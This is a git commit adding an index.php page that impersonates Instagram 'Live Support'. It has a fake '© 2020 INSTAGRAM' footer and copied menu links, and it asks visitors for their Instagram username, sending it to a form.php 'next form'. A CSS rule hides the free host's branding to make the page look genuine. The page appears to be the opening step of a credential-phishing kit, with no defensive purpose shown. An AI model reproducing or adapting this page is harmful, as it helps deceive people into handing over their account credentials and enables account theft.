f54f4ba4de2f20fa947dbe1b8c327180d9de4526
phpsleytr <74647552+phpsleytr@users.noreply.github.com>
2020-11-25 09:25:02 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,116 @@
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Support </title>
+
+<link rel="shortcut icon" type="image/png" href="/a.png"/>	
+<style>
+#copyright{
+color:#999;}
+#menu{
+
+
+width:91%;
+} 
+
+#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:14px; font-weight:540; vertical-align: baseline; } 
+#winsonxx{
+background-color:white;
+width:91%;
+
+}
+#winsonx{
+font-family:sans-serif;
+font-weight:200;
+letter-spacing:;
+color:#3d3d3d;
+font-size:20px;}
+#winsonxdd{
+width:60%;
+color:#999;
+font-family:sans-serif;
+}
+#nick{
+background-color:#fafafa;
+border:1px solid #cecece;
+outline:none;
+border-radius:6px;
+width:220px;
+height:35px;
+text-align:center;
+font-size:16px;}
+
+#winsonbuton{
+color:white;
+background-color:#000000;
+font-size:17px;
+
+border-radius:5px;
+outline:none;
+font-family:sans-serif;
+font-weight:540;
+border:0;
+width:170px;
+height:30px;
+font-weight:bold;
+
+}
+#nick:hover{
+
+    border:1px solid #cecece;
+    width:310px;
+    max-width:80%;
+
+}
+</style>
+</head>     
+
+<body>
+<style > 
+	img[src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"]{
+	 display:none!important;
+	}
+</style>
+<body bgcolor="#fafafa">
+<br>
+<br>
+<br>
+<center>
+<form method="get" action="form.php">
+<div id="winsonxx" style="border:1px solid #cecece;">
+<img src="https://i.imgyukle.com/2020/08/03/S9tXgY.gif" width=100 >
+
+<h1 id="winsonx"> Enter username and next. </h1>
+
+<p id="winsonxdd">Please write your instagram username and click "Next" and fill the next form. <br>
+#shareblackstories </p><br>
+
+
+
+<input type="text" id="nick" name="nick" required="" placeholder="Username" class="qua21"><br><br>
+<br>
+<input type="submit" value="Next" id="winsonbuton" style="">
+<br>
+
+</form>
+<br><br>
+</div>
+</center>
+<center><br> <br>
+
+
+
+<div id="get">
+<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
+<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
+</div>
+<br><br><br>
+<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;"> © 2020 INSTAGRAM </p>
+<br>
+
+</center>
+
+</body>
+
+</html>
